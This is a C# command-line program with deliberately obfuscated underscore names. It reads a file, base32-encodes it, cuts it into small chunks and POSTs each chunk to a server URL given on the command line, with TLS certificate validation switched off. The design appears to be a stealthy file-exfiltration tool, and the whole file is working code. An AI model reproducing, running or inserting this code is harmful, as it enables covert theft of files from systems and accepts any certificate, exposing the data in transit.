using System;
using System.IO;
using System.Net;
using System.Text;
using System.Collections.Generic;

class _1
{
	public void _(string _)
	{
		Console.Error.WriteLine("[-] Error: " + _);
		Environment.Exit(1);
	}

	public void __(string _, int __=1)
	{
		Console.Write(_);
		if (__ == 1)
			Console.WriteLine();
	}
}

class _2
{
	public void _()
	{
		string __ = Path.GetFileName(Environment.GetCommandLineArgs()[0]);
		new _1().__("Usage: " + __ + " <options>");
		new _1().__("Options:");
		new _1().__("  -u, --url\t\tServer url.");
		new _1().__("  -f, --file\t\tMain file.");
		new _1().__("  -b, --bytes\t\tMax bytes per run. (default: 50)");
		Environment.Exit(0);
	}
}

class _3
{
	public void _(string __, string ___)
	{
		WebClient ____ = new WebClient();
		ServicePointManager.ServerCertificateValidationCallback = (_____, ______, _______, _________) => true;
		____.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
		byte[] __________ = ____.UploadData(__, "POST", System.Text.Encoding.UTF8.GetBytes(___));
		string ___________ = System.Text.Encoding.UTF8.GetString(__________);
	}

	public string __(byte[] _)
	{
		string __ = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
		StringBuilder ___ = new StringBuilder();
		int ____ = 0;
		int _____ = 0;

		foreach (byte ______ in _)
		{
			_____ = (_____ << 8) | ______;
			____ += 8;

			while (____ >= 5)
			{
				___.Append(__[(_____ >> (____ - 5)) & 0x1F]);
				____ -= 5;
			}
		}

		if (____ > 0)
		{
			_____ <<= (5 - ____);
			___.Append(__[_____ & 0x1F]);
		}

		while (___.Length % 8 != 0)
			___.Append('=');

		return ___.ToString();
	}

	public List<string> ___(string _, int __)
	{
		List<string> ___ = new List<string>();

		if (_.Length > __)
		{
			for (int ____ = 0; ____ < _.Length; ____ += __)
			{
				int _____ = Math.Min(__, _.Length - ____);
				___.Add(_.Substring(____, _____));
			}
		}
		else ___.Add(_);

		return ___;
	}
}

class _4
{
	static void Main(string []_)
	{
		// new _3()._(_[0], "file=test.txt&data=NBSWY3DP");
		// new _1().__(new _3().__(Encoding.ASCII.GetBytes(_[0])));
		string __ = "", ___ = "", ____ = "";
		int _____ = 50;

		Console.CancelKeyPress += (______, _______) =>
		{
			new _1().__("\n[-] Exiting...");
			Environment.Exit(1);
		};

		if (_.Length < 4 || _.Length > 7)
			new _2()._();

		for (int ________ = 0; ________ < _.Length; ________++)
		{
			if (_[________] == "-h" || _[________] == "--help")
				new _2()._();

			else if (_[________] == "-u" || _[________] == "--url")
			{
				try{__ = _[________+1];}
				catch (IndexOutOfRangeException){new _1()._("-u/--url expected a proper https url or atleast an ip.");}
				if (!__.StartsWith("http"))
					__ = "https://" + __;
			}

			else if (_[________] == "-f" || _[________] == "--file")
			{
				try
				{
					___ = Path.GetFileName(_[________+1]);
					____ = new _3().__(File.ReadAllBytes(_[________+1]));
				}
				catch (IndexOutOfRangeException){new _1()._("-f/--file expected a proper file.");}
				catch (FileNotFoundException){new _1()._("File not found.");}
			}

			else if (_[________] == "-b" || _[________] == "--bytes")
			{
				try
				{
					if (!int.TryParse(_[________+1], out _____))
						throw new IndexOutOfRangeException();
				}
				catch (IndexOutOfRangeException){new _1()._("-b/--bytes expected a integer.");}
			}
		}

		float _________ = 1.0F;
		List<string> __________ = new _3().___(____, _____);
		new _1().__("[>] Starting Transmission...[ENTER]", 0);
		Console.ReadKey();
		new _1().__("");

		foreach (string ________ in __________)
		{
			new _3()._(__, "file=" + ___ + "&data=" + ________);
			new _1().__("[>] Progress: " + (int) (_________ / __________.Count * 100) + "%\r", 0);
			_________++;
		}
	}
}